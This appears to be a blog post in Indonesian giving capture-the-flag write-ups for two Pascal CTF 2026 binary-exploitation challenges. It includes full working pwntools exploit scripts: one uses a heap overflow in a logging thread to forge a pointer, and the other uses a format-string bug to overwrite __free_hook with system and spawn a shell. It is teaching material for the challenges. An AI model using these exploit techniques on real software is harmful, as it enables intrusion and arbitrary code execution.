---
layout: post
title: "Pascal CTF 2026 - Pwn"
date: 2026-02-01
image: /assets/.
categories: ["PascalCTF"]
tags: [pwn, format string, heap, ctf2026]
---


## Packet Tracer 2

Target: `nc pt2.ctf.pascalctf.it 9005`

### Intro

Waktu baca deskripsi challenge ini, aku kebayangnya bakal kayak “simulator jaringan versi CLI” yang isinya cuma ping/ping/ping. Ternyata bener: menunya emang mirip Packet Tracer mini… tapi di balik itu ada dua hal yang bikin ini langsung terasa “pwnable”:

1) ada **thread** yang diam-diam ngecek kondisi “win”, dan  
2) ada sistem **logging** yang kelihatannya “cuma print log”, tapi ternyata jadi jalur "tulang punggung" exploit.

Target kita simpel: bikin program percaya ada sebuah router interface yang “terhubung” ke host spesial bernama `win_host`, supaya thread kemenangan nyetak flag.

---

### Recon: binary apa, proteksi apa

```bash
$ file PT2
$ checksec --file=PT2
```

Hasilnya:
- **PIE** aktif (alamat fungsi itu offset relatif, bukan fixed absolute)
- **NX** aktif
- **Canary** ada
- **RELRO** partial
- Binary **not stripped** + ada **debuginfo** (enak banget buat ngebaca struct/field)

Kalau lihat symbolnya:
```bash
$ nm -an PT2 | rg 'win_host_thread|get_string|log_thread|get_log|reset_logging|show_network|setup_chall'
0000000000001319 T setuSp_chall
00000000000017ad T get_string
000000000000468b T show_network
00000000000058a6 T log_thread
0000000000005cfa T reset_logging
0000000000005d83 T get_log
0000000000005aeb T win_host_thread
```

Catatan: karena PIE, angka di atas adalah **offset** (runtime address = `base + offset`).

---

### “Win condition”-nya: bukan ret2win, tapi “connect to win_host”

Aku mulai dari nyari fungsi yang seperti “menang”: `win_host_thread`.

Potongan ASM penting (offset `PIE+0x5aeb`):
```asm
5b9d: mov rax, QWORD PTR [rbp-0x418]   ; interface ptr
5ba4: mov rdx, QWORD PTR [rax]         ; interface->connected_to
5ba7: mov rax, QWORD PTR [rbp-0x420]   ; arg = win_host
5bae: cmp rdx, rax
5bb1: jne ...
5bbd: call getenv("FLAG")
5bf5: call fputs
5bff: call exit(0)
```

Pseudocode:
```c
void *win_host_thread(Host *win_host) {
  while (win_host->is_running) {
    for (int r = 0; r <= 4; r++) {
      if (!routers[r]) continue;
      for (int i = 0; i <= 3; i++) {
        Interface *itf = &routers[r]->interfaces[i];
        if (itf->connected_to == win_host) {
          const char *flag = getenv("FLAG");
          if (!flag) flag = "FLAG not set";
          fputs(flag, stderr);
          exit(0);
        }
      }
    }
    thrd_sleep(1s);
  }
}
```

Jadi ini bukan “panggil win()”, tapi **manipulasi state**: cukup bikin `router->interfaces[x].connected_to == win_host`.

---

### Plot twist: `win_host` itu nyata, cuma “disembunyikan”

Aku bongkar `setup_chall` (offset `PIE+0x1319`) dan nemu momen yang bikin semuanya pas:

- program bikin host bernama `win_host`
- nyalain thread-nya
- dan… **naro dia di `hosts[30]`**, sementara UI normal host index biasanya cuma “terasa” sampai 29

Potongan ASM penting:
```asm
1414: call   3cb6 <create_host>        ; create win_host
1419: mov    QWORD PTR [rip+...], rax  ; win_host global
...
14ce: mov    rax, QWORD PTR [rip+...]  ; win_host
14d5: mov    QWORD PTR [rip+...], rax  ; hosts[30] = win_host
```

Alamat global yang relevan (offset PIE):
- `name` buffer: `PIE+0x9160`
- `win_host` pointer global: `PIE+0x9180`
- `routers[]`: `PIE+0x91a0`
- `hosts[]`: `PIE+0x91e0` (jadi `hosts[30]` ada di `hosts + 0xf0`)

Sekarang problemnya tinggal satu: gimana caranya “nyuntik” pointer `win_host` ke `Interface.connected_to`.

---

### Primitive #1 — Leak pointer `win_host` lewat `strdup()` yang “overread”

Fungsi input nama ini mencurigakan: `get_string` (offset `PIE+0x17ad`).

ASM-nya literally begini:
```asm
17e3: lea rax, [rip+0x7976]   ; &name
17ea: mov edx, 0x20           ; 32 bytes
17f7: call read(0, name, 0x20)
```

Pseudocode:
```c
// global char name[0x20];
void get_string(const char *prompt) {
  printf("%s", prompt);
  read(0, name, 0x20);     // NO null terminator guarantee
}
```

Lalu `create_host` (offset `PIE+0x3cb6`) melakukan:
```c
host->name = strdup(name);
```

Kalau kita kirim **tepat 32 byte tanpa `\\0`**, `strdup()` bakal terus membaca setelah `name[0x20]`.

Dan di binary ini, layout `.bss` kebetulan “enak”: **tepat setelah `name` ada `win_host` pointer**.
Artinya, `strdup(name)` akan ikut “nelen” bytes pointer `win_host`.

Lalu kita panggil `show_network`: dia print host name pakai `%s`, sehingga string hasil `strdup` (yang sekarang mengandung bytes pointer) bakal kebaca sebagai leak.

Di exploit, aku bikin host index 0 bernama `b"A"*32`, lalu ambil 6 byte setelahnya sebagai leak heap pointer:

```py
leak_name = b"A" * 0x20
create_host(io, 0, leak_name)
show_network(io)
io.recvuntil(leak_name)
leak6 = io.recvn(6)
win_host = u64(leak6 + b"\\x00\\x00")
```

Kenapa cuma 6 byte?
- pointer x86_64 biasanya “cuma pakai” 48 bit (byte atas 2 = 0)
- plus nanti di overwrite router, kita memang sengaja nulis 6 byte aja, sisanya tetap 0 karena router di-`memset(0)`

---

### Primitive #2 — Heap overflow “cantik” dari thread logging

Ini bagian yang paling kayak Packet-Tracer-banget: setiap host menerima packet, dia bikin log line:

```c
snprintf(buf, 0x400,
  "[HOST %s] Received on eth0 (...snip...) | %lu bytes | %s",
  host->name, ..., strlen(packet->data), packet->data
);
log_message(buf);
```

`log_message` menaruh string ke `log_buffer` global (slot 0x400 bytes per entry).

Lalu `log_thread` (offset `PIE+0x58a6`) memindahkan log buffer itu ke heap object:
```asm
59cd: call get_log            ; malloc(0x208)
5a03: add  rax, 0x8           ; dst = log + 8
5a0d: call strcpy(dst, log_buffer+0x400)
```

Pseudocode:
```c
typedef struct {
  time_t t;        // 8 bytes
  char msg[0x200]; // 512 bytes
} Log;             // total 0x208

void log_thread() {
  if (log_buffer_has_data) {
    Log *l = get_log();             // malloc(0x208)
    strcpy(l->msg, log_buffer_slot); // BOOM: no bounds
    l->t = time(NULL);
  }
}
```

Kalau log line lebih panjang dari `0x200`, `strcpy` overflow ke chunk berikutnya di heap.

#### Kenapa offset overwrite-ku `0x208` (bukan `0x218`)?

Di glibc 2.39 (libc yang dikasih), `malloc(0x208)` menghasilkan chunk dengan size field `0x211`, artinya:

- total chunk size = `0x210` bytes
- user area = `0x208` bytes (pas sama request)
- `strcpy` mulai nulis di `log + 8` (karena `msg` ada setelah `time_t`)
- awal **user chunk berikutnya** ada di `log + 0x210`

Formula singkat:

```text
start(dst) = log + 0x8
next_user  = log + 0x210
offset     = next_user - start = 0x210 - 0x8 = 0x208
```

Yang penting: di exploit, aku mau bytes pointer `win_host` jatuh persis ke awal chunk router (user data), karena field pertama router adalah `interfaces[0]`, dan field pertama `Interface` adalah `connected_to`.

Struktur `Interface` (dari DWARF) mulai dengan:

```c
typedef struct Interface {
  void *connected_to;   // offset 0
  Packet *buffer[8];
  ...
} Interface;            // size 0x90
```

---

### Heap feng shui: bikin log chunk “nempel” router chunk

Triknya:

1) Masuk simulation, kirim packet kecil → memaksa `get_log()` allocate chunk log `0x208`
2) Keluar simulation → `reset_logging()` memaksa log thread nge-`free()` semua log heap object
3) Di main menu, buat router → `malloc(0x2e8)` mengambil chunk baru yang biasanya jatuh **setelah** area log chunk yang tadi (yang sekarang ada di tcache)
4) Masuk simulation lagi, kirim packet dengan payload panjang → `get_log()` mengambil kembali freed log chunk dari tcache, lalu `strcpy` overflow ke chunk router yang berada tepat setelahnya

Begitu `router->interfaces[0].connected_to` jadi `win_host`, thread kemenangan nge-print flag dan exit.

---

### Ngerakit payload: align pointer `win_host` tepat di offset `0x208`

Masalah kecil yang bikin exploit ini terasa nge dongeng: string log itu punya **prefix** yang panjangnya tergantung:
- nama host (`%s`)
- angka `payload_len` (`%lu`)

Jadi aku bikin helper yang “meniru” format log di C, lalu cari `padlen` yang pas:

```py
def find_padlen_for_router_overwrite(host_name, target_off, ptr_low6):
  for padlen in range(0, 0x400):
    payload_len = padlen + len(ptr_low6)
    prefix = render_prefix_like_snprintf(host_name, payload_len)
    if len(prefix) + padlen == target_off:
      return b"A"*padlen + ptr_low6
```

Dan pointer yang ditulis cuma 6 byte:

```py
ptr_low6 = p64(win_host)[:6]
```

Alasannya dua:

- dua byte atas pointer heap biasanya `\\x00\\x00`
- router di-`memset(0)`, jadi kalau kita cuma overwrite low 6 bytes, high 2 bytes tetap 0 → pointer jadi valid full 8 bytes

Implementasi full-nya ada di `solve.py`.

---

### Exploit

```python
#!/usr/bin/env python3
from __future__ import annotations

import os
import time
from dataclasses import dataclass

from pwn import context, p64, process, remote


context.binary = "./PT2"
context.log_level = os.environ.get("LOG", "info")


LD = "./ld-linux-x86-64.so.2"
LIBC_DIR = "."
BIN = "./PT2"


@dataclass
class HostLogPrefix:
    host_name: bytes
    ip: tuple[int, int, int, int]
    src: tuple[int, int, int, int]
    dst: tuple[int, int, int, int]
    payload_len: int

    def render_prefix(self) -> bytes:
        fmt = (
            b"[HOST %s] Received on eth0 (%u.%u.%u.%u): "
            b"%u.%u.%u.%u -> %u.%u.%u.%u | %lu bytes | "
        )
        # The program uses snprintf with C formatting; mimic it.
        return fmt % (
            self.host_name,
            *self.ip,
            *self.src,
            *self.dst,
            self.payload_len,
        )


def start_local():
    env = os.environ.copy()
    env.setdefault("MALLOC_ARENA_MAX", "1")
    env.setdefault("FLAG", "LOCAL{test_flag}")
    # Avoid accidentally inheriting a preloaded library into the challenge binary.
    env.pop("LD_PRELOAD", None)
    if os.environ.get("TRACE_MALLOC"):
        env["LD_PRELOAD"] = os.environ["TRACE_MALLOC"]
    return process([LD, "--library-path", LIBC_DIR, BIN], env=env)


def start_remote():
    return remote("pt2.ctf.pascalctf.it", 9005)


def menu_choice(io, n: int):
    io.sendlineafter(b"Enter your choice: ", str(n).encode())


def create_host(io, idx: int, name_bytes: bytes):
    menu_choice(io, 1)
    io.sendlineafter(b"Enter host index: ", str(idx).encode())
    io.recvuntil(b"Enter host name: ")
    if len(name_bytes) > 0x20:
        raise ValueError("host name > 32 bytes")
    # get_string() is a raw read(0, name, 0x20) with no terminator guarantee.
    # Send exactly 32 bytes when we want an unterminated string; otherwise send a line.
    if len(name_bytes) == 0x20 and b"\n" not in name_bytes:
        io.send(name_bytes)
    else:
        io.send(name_bytes + b"\n")


def create_router(io, idx: int, name_bytes: bytes):
    menu_choice(io, 2)
    io.sendlineafter(b"Enter router index: ", str(idx).encode())
    io.recvuntil(b"Enter router name: ")
    if len(name_bytes) > 0x20:
        raise ValueError("router name > 32 bytes")
    io.send(name_bytes + b"\n")


def show_network(io):
    menu_choice(io, 15)


def enter_simulation(io):
    menu_choice(io, 16)


def sim_choice(io, n: int):
    io.sendlineafter(b"Enter your choice: ", str(n).encode())


def sim_send_self_packet_in_simulation(io, host_idx: int, payload: bytes):
    sim_choice(io, 1)  # Send Packet
    io.sendlineafter(b"Enter Host Index", str(host_idx).encode())
    io.sendlineafter(b"Enter IP (4 bytes, space-separated): ", b"0 0 0 0")
    io.recvuntil(b"Enter data (max ")
    io.recvuntil(b"bytes): ")
    if b"\n" in payload:
        raise ValueError("payload contains newline")
    io.send(payload + b"\n")


def sim_read_logs_in_simulation(io) -> bytes:
    sim_choice(io, 2)
    # It prints 0..N lines and then prints the simulation prompt again.
    data = io.recvuntil(b"Enter your choice: ", drop=False, timeout=2)
    return data


def exit_simulation(io):
    # Option 3: "Return to main menu" (also resets logs).
    sim_choice(io, 3)


def leak_win_host_ptr(io) -> int:
    # Create a host with an unterminated 32-byte name so strdup() reads past
    # the global name buffer into the adjacent win_host pointer.
    leak_name = b"A" * 0x20
    create_host(io, 0, leak_name)

    show_network(io)
    io.recvuntil(leak_name)
    leak6 = io.recvn(6)
    win_host = int.from_bytes(leak6 + b"\x00\x00", "little")
    return win_host


def find_padlen_for_router_overwrite(host_name: bytes, target_off: int, ptr_low6: bytes) -> bytes:
    ip = (0, 0, 0, 0)
    src = (0, 0, 0, 0)
    dst = (0, 0, 0, 0)

    for padlen in range(0, 0x400):
        payload_len = padlen + len(ptr_low6)
        prefix = HostLogPrefix(host_name, ip, src, dst, payload_len).render_prefix()
        if len(prefix) + padlen == target_off:
            payload = b"A" * padlen + ptr_low6
            if len(prefix) + len(payload) >= 0x3FF:
                continue
            return payload
    raise RuntimeError("failed to find padlen")


def exploit(io, *, final_timeout: float = 20.0, fast_prep: bool = False):
    win_host = leak_win_host_ptr(io)
    ptr_low6 = p64(win_host)[:6]

    # Use a clean host for logging so prefix length is stable.
    create_host(io, 1, b"h")

    # Stage 1: create at least one log struct (chunk size 0x220) so it exists on the heap,
    # then return to main menu (which resets/frees logs). The freed log chunk remains in-place.
    enter_simulation(io)
    sim_send_self_packet_in_simulation(io, 1, b"hi")
    # Give host_thread+log_thread enough time to enqueue+materialize at least one heap log.
    if fast_prep:
        # Poll until the log line actually appears (meaning log_thread allocated a heap log).
        seen = False
        for _ in range(6):
            time.sleep(0.8)
            data = sim_read_logs_in_simulation(io)
            if b"[HOST h] Received on eth0" in data:
                seen = True
                break
        if not seen:
            # Fall back to a longer wait; on some systems threads may be slow to schedule.
            time.sleep(2.0)
    else:
        time.sleep(3.0)
    exit_simulation(io)  # frees the log struct(s) we just created

    # Stage 2: allocate router R0 after the freed log chunk, so the router chunk is
    # physically adjacent (right after) that freed chunk.
    create_router(io, 0, b"r")

    # Stage 3: trigger reset_logging() (happens inside the send action) and then make a
    # host log line long enough that the log_thread strcpy overflows into the next chunk
    # (our router), overwriting interface[0].peer to win_host.
    # For glibc 2.39, malloc(0x208) returns a chunk with size field 0x211 (0x210 bytes
    # including the chunk header). The next chunk's user pointer is thus +0x210 from the
    # log struct pointer. Since strcpy starts at log+0x8, the offset to the next chunk's
    # user data is 0x210 - 0x8 = 0x208.
    target_off = int(os.environ.get("OFF", "0x208"), 0)
    payload = find_padlen_for_router_overwrite(host_name=b"h", target_off=target_off, ptr_low6=ptr_low6)
    enter_simulation(io)
    sim_send_self_packet_in_simulation(io, 1, payload)

    # Wait for win_host_thread to notice and print FLAG then exit.
    return io.recvall(timeout=final_timeout)


if __name__ == "__main__":
    use_remote = os.environ.get("REMOTE", "0") == "1"
    brute = os.environ.get("BRUTE", "0") == "1"

    if brute:
        # Local-only brute force to calibrate the exact overwrite offset.
        if use_remote:
            raise SystemExit("BRUTE=1 is local-only")
        wanted = os.environ.get("FLAG", "LOCAL{test_flag}").encode()
        for off in range(0x200, 0x260):
            os.environ["OFF"] = hex(off)
            io = start_local()
            try:
                out = exploit(io, final_timeout=1.8, fast_prep=True)
            except Exception as e:
                try:
                    io.close()
                except Exception:
                    pass
                print(f"off={off:#x} exception={e}", flush=True)
                continue
            s = out if isinstance(out, (bytes, bytearray)) else bytes(out)
            if wanted in s:
                print(f"FOUND off={off:#x}")
                print(s.decode(errors='replace'))
                raise SystemExit(0)
            print(f"off={off:#x} no-flag (len={len(s)})", flush=True)
        raise SystemExit("not found in range")

    io = start_remote() if use_remote else start_local()
    out = exploit(io)
    print(out.decode(errors="replace"))
```

Local (pakai loader+libc bawaan repo):

```bash
python3 solve.py
```

Remote:
```bash
REMOTE=1 python3 solve.py
```

Output remote akhirnya ngeluarin:
```
pascalCTF{1_w15h_1t_w4s_4s_e4sy_t0_g3t_4_10_1n_n3tw0rks}
```

### Flag

`pascalCTF{1_w15h_1t_w4s_4s_e4sy_t0_g3t_4_10_1n_n3tw0rks}`

---

## YetAnotherNoteTaker

Target: `nc notetaker.ctf.pascalctf.it 9002`

### Intro

Aku ngerti banget judulnya: *“I've read too many notes recently, I cant take it anymore…”*.
Tapi justru karena itu, challenge ini rasanya kayak undangan resmi buat **membalas dendam ke note** yang “cuma” 256 byte.

Di permukaan, ini program CLI super sederhana: tulis note, baca note, hapus note, keluar.
Di baliknya? Satu baris `printf()` yang salah tempat, dan tiba-tiba kita punya jalan tol ke shell.

---

### Recon: bedah paketnya dulu

File yang dikasih berupa zip:

```bash
$ ls -la
notetaker.zip

$ unzip -l notetaker.zip
challenge/notetaker
challenge/libs/libc.so.6
challenge/libs/ld-2.23.so
```

Karena interpreter binary-nya relative (`./libs/ld-2.23.so`), jalankan dari folder `challenge/` biar loader-nya ketemu:

```bash
$ cd challenge
$ ./notetaker
1. Read note
2. Write note
3. Clear note
4. Exit
>
```

Cek mitigasi:

```bash
$ checksec --file=./notetaker
RELRO: Full RELRO
Stack: Canary found
NX:    NX enabled
PIE:   No PIE (0x400000)
```

Mitigasi lumayan “rapi”: canary + NX + Full RELRO. Tapi **No PIE** berarti alamat `.text`/GOT statik (enak buat referensi).

---

### Reverse cepat: apa yang sebenarnya terjadi di `main`

Aku pakai `objdump` buat lihat `.text`:

```bash
$ objdump -d --no-show-raw-insn -M intel ./notetaker | less
```

Potongan paling penting ada di jalur “Read note”:

```asm
; case 1: read note
0x400ad8: lea rax, [rbp-0x110]   ; note buffer (0x100 bytes)
0x400adf: mov rdi, rax
0x400ae7: call printf@plt        ; printf(note)  <-- format string bug
0x400af1: call putchar@plt
```

Yes: **note-nya dipakai langsung sebagai format string**.
Jadi kalau note berisi `%p %p %p`, program bakal nge-print pointer-pointer dari stack, bukan literal `%p`.

Sementara “Write note” cuma `read(0, note, 0x100)` dan nol-terminate di newline. “Clear note” cuma `memset`.

Bonus lucu: pilihan menu “4. Exit” itu bohong (nggak ada case exit). Program cuma exit kalau input menu `<= 0` atau `> 4`.

---

### Pseudocode

Versi C-like yang ringkas (alamat fungsi: `main = 0x400a03`, `menu = 0x40099e`):

```c
void menu(void) {
  puts("1. Read note");
  puts("2. Write note");
  puts("3. Clear note");
  puts("4. Exit");
  printf("> ");
}

int main(void) {
  init();                 // setvbuf stdin/stdout/stderr unbuffered
  char note[0x100] = {0};

  while (1) {
    menu();

    char *tmp = malloc(0x10);
    memset(tmp, 0, 0x10);
    fgets(tmp, 0x10, stdin);

    int choice = 0;
    sscanf(tmp, "%d", &choice);
    free(tmp);

    if (choice == 1) {
      printf(note);       // BUG: format string
      putchar('\n');
    } else if (choice == 2) {
      printf("Enter the note: ");
      read(0, note, 0x100);
      note[strcspn(note, "\n")] = 0;
    } else if (choice == 3) {
      memset(note, 0, 0x100);
      puts("Note cleared.");
    }

    if (choice <= 0 || choice > 4)
      break;
  }
  return 0;
}
```

Satu hal yang harus diingat dari pseudocode ini: tiap loop, program selalu melakukan `malloc(0x10) -> fgets() -> free()`.
Itu penting banget untuk fase akhir exploit.

---

### Strategi exploit: format string → leak libc → overwrite `__free_hook` → shell

Target kita bukan ret2libc klasik (canary + NX) dan bukan GOT overwrite (Full RELRO).
Jadi plan yang “enak” di glibc 2.23 adalah:

1. **Leak alamat libc** lewat format string, ambil `printf@GOT`.
2. Hitung `libc_base`.
3. **Overwrite `__free_hook` jadi `system`** (ini variabel di libc, bukan GOT).
4. Trigger `free(buf)` dengan `buf == "/bin/sh"` → berubah jadi `system("/bin/sh")`.

Alamat statik dari binary (No PIE):

```text
printf@GOT = 0x601fb0
```

Offset symbol libc (dari `challenge/libs/libc.so.6`, glibc 2.23):

```text
printf     = 0x0000000000055810
system     = 0x00000000000453a0
__free_hook= 0x00000000003c67a8
```

---

### Bagian “ajaib” format string: gimana caranya nyuntik argumen?

Kita memanggil `printf(note)` tanpa argumen variadic.
Tapi format string bisa “maksa” `printf` buat membaca argumen yang *seharusnya nggak ada* dari area stack.

Karena `note` sendiri ada di stack frame `main`, sebagian “argumen” yang dibaca `printf` bisa mengarah ke bytes yang kita kontrol di buffer `note` itu sendiri.

Aku nyari offset-nya dengan payload marker dan `%p` spray:

```python
write_note(b'AAAABBBB ' + b'%p '*40)
read_note()
```

Di output, kelihatan `0x4242424241414141` muncul sebagai salah satu argumen.
Ini berarti 8 byte awal `note` kebaca sebagai “argumen”.

Dari eksperimen itu, offset yang stabil untuk challenge ini:

- Argumen ke-8 (`%8$p`) mulai membaca dari awal buffer kita.
- Kalau kita taruh pointer di offset `0x80` dari awal note, itu jadi argumen:

```text
BASE_ARG = 8 + (0x80 / 8) = 24
```

Jadi: address yang kita taruh pada `note[0x80:0x88]` akan bisa dipakai sebagai `%24$...`.

Trik tambahan: kita pakai `\x00` di tengah input.
Kenapa? Karena `read()` mengizinkan byte nol; `printf` berhenti di `\0`, tapi bytes setelahnya tetap ada di stack dan tetap bisa dipakai sebagai “argumen” (alamat-alamat target).

---

### Leak libc: baca `printf@GOT` pakai `%24$.8s`

Payload leak yang dipakai:

```text
%24$.8s<<<END>>>\x00 + padding sampai offset 0x80 + p64(printf@GOT)
```

Kenapa `.8s`?
- Kita mau ambil 8 byte pointer `printf` dari GOT.
- `%.8s` mencegah `printf` nge-print terlalu panjang kalau ketemu memory tanpa null.

Hasilnya: kita dapat `printf_addr` runtime, lalu:

```text
libc_base = printf_addr - libc.printf
```

---

### Write primitive: ubah `__free_hook` → `system` (pakai `%hn`)

Setelah tahu `libc_base`, kita hitung:

```text
free_hook = libc_base + __free_hook
system    = libc_base + system
```

Untuk nulis 8 byte ke `__free_hook`, kita split jadi 4 *halfword* (2 byte) dan tulis pakai `%hn`.
Empat alamat target (`free_hook+0`, `+2`, `+4`, `+6`) kita taruh sebagai argumen `%24$`, `%25$`, `%26$`, `%27$`.

Biar kontrol “jumlah karakter tercetak” rapi, kita pakai padding `%1$<delta>c` (pakai argumen pertama sebagai dummy).

Ini inti algoritmanya:

```python
parts = [(value>>0)&0xffff, addr+0],
        [(value>>16)&0xffff, addr+2],
        [(value>>32)&0xffff, addr+4],
        [(value>>48)&0xffff, addr+6]

urutkan parts berdasarkan halfword yang mau ditulis
for tiap (want, target, argi):
  cetak (want - printed) char
  %argi$hn
```

---

### Trigger: kenapa `/bin/sh` cukup dikirim sebagai “menu choice”?

Balik ke pseudocode:

```c
tmp = malloc(0x10);
fgets(tmp, 0x10, stdin);
sscanf(tmp, "%d", &choice);
free(tmp);
```

Kalau `__free_hook` sudah jadi `system`, maka `free(tmp)` berubah jadi:

```c
system(tmp);
```

Jadi kita tinggal kirim string `/bin/sh` saat diminta input menu:

```text
> /bin/sh
```

Dan boom: shell.

---

### Exploit code (end-to-end)

```python
#!/usr/bin/env python3
from pwn import *
import os


HOST = os.environ.get("HOST", "notetaker.ctf.pascalctf.it")
PORT = int(os.environ.get("PORT", "9002"))

HERE = os.path.dirname(os.path.abspath(__file__))
CHALL_DIR = os.path.join(HERE, "challenge")

ELF_PATH = os.path.join(CHALL_DIR, "notetaker")
LIBC_PATH = os.path.join(CHALL_DIR, "libs", "libc.so.6")

elf = context.binary = ELF(ELF_PATH)
libc = ELF(LIBC_PATH)

context.arch = "amd64"

ADDR_OFF = 0x80
BASE_ARG = 8 + (ADDR_OFF // 8)
TAG = b"<<<END>>>"


def _menu_choice(io: tube, s: bytes) -> None:
    io.recvuntil(b"> ")
    io.sendline(s)


def _write_note(io: tube, payload: bytes) -> None:
    _menu_choice(io, b"2")
    io.recvuntil(b"Enter the note: ")
    io.send(payload + b"\n")


def _read_note_leak(io: tube) -> bytes:
    _menu_choice(io, b"1")
    data = io.recvuntil(TAG)
    leak = data[: -len(TAG)]
    io.recvuntil(b"\n")
    return leak


def _build_leak_payload(addr: int) -> bytes:
    fmt = b"%" + str(BASE_ARG).encode() + b"$.8s" + TAG
    payload = fmt + b"\x00"
    payload = payload.ljust(ADDR_OFF, b"B")
    payload += p64(addr)
    if len(payload) > 0x100:
        raise ValueError(f"leak payload too long: {len(payload)} bytes")
    return payload


def _build_write_qword_payload(addr: int, value: int) -> bytes:
    parts: list[tuple[int, int, int]] = []
    for i in range(4):
        parts.append(((value >> (16 * i)) & 0xFFFF, addr + 2 * i, BASE_ARG + i))

    fmt = b""
    printed = 0
    for wanted, _, argi in sorted(parts, key=lambda x: x[0]):
        delta = (wanted - printed) & 0xFFFF
        if delta:
            fmt += b"%1$" + str(delta).encode() + b"c"
        fmt += b"%" + str(argi).encode() + b"$hn"
        printed = wanted

    payload = fmt + b"\x00"
    payload = payload.ljust(ADDR_OFF, b"B")
    for _, a, _ in parts:
        payload += p64(a)
    if len(payload) > 0x100:
        raise ValueError(f"write payload too long: {len(payload)} bytes")
    return payload


def exploit(io: tube) -> None:
    _write_note(io, _build_leak_payload(elf.got["printf"]))
    printf_addr = u64(_read_note_leak(io).ljust(8, b"\x00"))

    libc_base = printf_addr - libc.symbols["printf"]
    system = libc_base + libc.symbols["system"]
    free_hook = libc_base + libc.symbols["__free_hook"]

    log.info("printf@libc = %s", hex(printf_addr))
    log.info("libc base   = %s", hex(libc_base))
    log.info("__free_hook = %s", hex(free_hook))
    log.info("system      = %s", hex(system))

    _write_note(io, _build_write_qword_payload(free_hook, system))
    _menu_choice(io, b"1")  # trigger the format-string write
    io.recvuntil(b"\n")

    # system will get called by free() on the menu input buffer.
    io.recvuntil(b"> ")
    io.sendline(b"/bin/sh")
    io.interactive()


def main() -> None:
    context.log_level = os.environ.get("LOG", "info")

    io = remote(HOST, PORT)
    exploit(io)


if __name__ == "__main__":
    main()
```

```bash
$ python3 solve.py
```

Inti payload leak + write ada di dua builder ini:

```py
def _build_leak_payload(addr):
    fmt = b"%" + str(BASE_ARG).encode() + b"$.8s" + TAG
    return fmt + b"\x00" + b"B"*(ADDR_OFF-len(fmt)-1) + p64(addr)

def _build_write_qword_payload(addr, value):
    # split 8 bytes into 4x %hn writes (2 bytes each)
    ...
```

### Flag

`pascalCTF{d1d_y0u_fr_h00k3d_th3_h3ap?}`

---
